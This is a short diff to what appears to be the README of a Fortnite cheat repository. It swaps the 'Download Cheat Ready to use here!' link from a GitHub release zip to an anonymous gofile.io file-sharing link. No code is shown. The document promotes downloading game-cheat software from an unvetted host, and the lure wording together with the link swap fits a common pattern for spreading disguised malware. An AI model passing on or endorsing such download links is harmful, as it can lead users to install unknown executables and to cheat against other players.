@@ -12,7 +12,7 @@
 
 # Download Cheat Ready to use here! 🔥
 
->>> # [Release](https://github.com/Yogianggara22/FortniteRageCheatSource/releases/download/Released/Fort_Installing_Modmenu.zip)
+>>> # [Release](https://gofile.io/d/6Is1U4)
 
 
 
